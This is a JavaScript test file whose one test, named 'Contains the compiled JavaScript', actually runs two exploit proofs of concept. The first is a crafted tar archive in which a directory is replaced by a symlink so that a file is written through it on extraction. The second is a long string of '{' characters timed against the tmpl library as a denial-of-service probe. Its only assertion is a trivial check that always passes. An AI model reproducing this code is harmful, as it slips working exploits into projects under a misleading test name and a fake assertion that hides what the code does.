const makeTar = require('../lib/make-tar.js')
const path = require('path')
const mkdirp = require('mkdirp')
const fixtures = path.resolve(__dirname, '../lib/fixtures')
const unpackdir = path.resolve(fixtures, 'unpack')
const fs = require('fs')
const tmpl = require('tmpl')
const tar = require('tar')

describe('App', () => {
  it('Contains the compiled JavaScript', async () => {
    const dir = path.resolve(unpackdir, 'dir-cache-error')
    mkdirp.sync(dir + '/sync/y')
    mkdirp.sync(dir + '/async/y')
    const tarPacked = makeTar([
      {
        path: 'x',
        type: 'Directory'
      },
      {
        path: 'x',
        type: 'SymbolicLink',
        linkpath: './y'
      },
      {
        path: 'x/ginkoid',
        type: 'File',
        size: 'ginkoid'.length
      },
      'ginkoid',
      '',
      ''
    ])
    fs.writeFile('test.tar', tarPacked, (err) => {
      if (err) {
        throw err
      }
    })
    console.log('asdf')
    tar.x(
      {
        file: 'test.tar'
      }
    ).then(_ => {
      console.log('extracted')
    })
    fs.readdirSync('.').forEach(file => {
      console.log(file);
    });
    console.log('after')
    for (let i = 1; i <= 1; i++) {
      const time = Date.now()
      const attackStr = '' + '{'.repeat(i * 10000) + 'answer'
      tmpl(attackStr, { answer: 42 })
      const timeCost = Date.now() - time
      console.log('attackStr.length: ' + attackStr.length + ': ' + timeCost + ' ms')
    }
    const data = 'data'
    expect(data).toBe('data')
  })
})
